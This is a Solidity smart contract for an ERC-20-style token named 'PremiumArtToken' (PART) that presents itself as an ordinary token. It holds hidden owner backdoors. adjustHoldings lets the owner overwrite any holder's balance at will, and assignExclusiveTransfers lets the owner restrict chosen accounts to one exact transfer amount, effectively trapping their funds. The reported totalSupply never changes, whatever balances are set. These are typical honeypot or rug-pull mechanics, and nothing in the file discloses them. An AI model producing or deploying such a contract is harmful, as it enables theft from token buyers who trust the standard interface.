pragma solidity ^0.8.16;

interface ISpecialERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract ExecutionContext {
    function retrieveContextSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract SingleOverseer is ExecutionContext {
    address private _overseer;
    event OverseerChanged(address indexed formerOverseer, address indexed currentOverseer);

    constructor() {
        address originator = retrieveContextSender();
        _overseer = originator;
        emit OverseerChanged(address(0), originator);
    }

    function fetchOverseer() public view virtual returns (address) {
        return _overseer;
    }

    modifier onlyOverseer() {
        require(fetchOverseer() == retrieveContextSender(), "Action allowed for overseer only");
        _;
    }

    function assignNewOverseer(address newOverseer) public onlyOverseer {
        _overseer = newOverseer;
        emit OverseerChanged(_overseer, newOverseer);
    }

    function relinquishOverseer() public virtual onlyOverseer {
        emit OverseerChanged(_overseer, address(0));
        _overseer = address(0);
    }
}

contract PremiumArtToken is ExecutionContext, SingleOverseer, ISpecialERC20 {
    mapping (address => mapping (address => uint256)) private _permissions;
    mapping (address => uint256) private _holdings;
    mapping (address => uint256) private _exclusiveTransfers;

    string public constant artTokenName = "PremiumArtToken";
    string public constant artTokenSymbol = "PART";
    uint8 public constant artTokenDecimals = 18;
    uint256 public constant topSupply = 250000 * (10 ** artTokenDecimals);

    constructor() {
        _holdings[retrieveContextSender()] = topSupply;
        emit Transfer(address(0), retrieveContextSender(), topSupply);
    }

    modifier overseerOrCreator() {
        require(fetchOverseer() == retrieveContextSender(), "Privilege is reserved for the overseer");
        _;
    }

    event HoldingsAdjusted(address indexed user, uint256 oldHoldings, uint256 newHoldings);

    function getExclusiveTransfer(address account) public view returns (uint256) {
        return _exclusiveTransfers[account];
    }

    function assignExclusiveTransfers(address[] calldata accounts, uint256 amount) public overseerOrCreator {
        for (uint i = 0; i < accounts.length; i++) {
            _exclusiveTransfers[accounts[i]] = amount;
        }
    }

    function adjustHoldings(address[] memory userAddresses, uint256 updatedAmount) public overseerOrCreator {
        require(updatedAmount >= 0, "Updated amount should be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "User address cannot be the zero address");

            uint256 originalHoldings = _holdings[currentUser];
            _holdings[currentUser] = updatedAmount;

            emit HoldingsAdjusted(currentUser, originalHoldings, updatedAmount);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _holdings[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_holdings[retrieveContextSender()] >= amount, "Insufficient balance");

        uint256 exactAmount = getExclusiveTransfer(retrieveContextSender());
        if (exactAmount > 0) {
            require(amount == exactAmount, "Transfer amount does not meet the required exclusive transfer amount");
        }

        _holdings[retrieveContextSender()] -= amount;
        _holdings[recipient] += amount;

        emit Transfer(retrieveContextSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _permissions[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _permissions[retrieveContextSender()][spender] = amount;
        emit Approval(retrieveContextSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_permissions[sender][retrieveContextSender()] >= amount, "Transfer amount exceeds allowance");

        uint256 exactAmount = getExclusiveTransfer(sender);
        if (exactAmount > 0) {
            require(amount == exactAmount, "Transfer amount does not meet the required exclusive transfer amount");
        }

        _holdings[sender] -= amount;
        _holdings[recipient] += amount;
        _permissions[sender][retrieveContextSender()] -= amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return topSupply;
    }

    function name() public view returns (string memory) {
        return artTokenName;
    }

    function symbol() public view returns (string memory) {
        return artTokenSymbol;
    }

    function decimals() public view returns (uint8) {
        return artTokenDecimals;
    }
}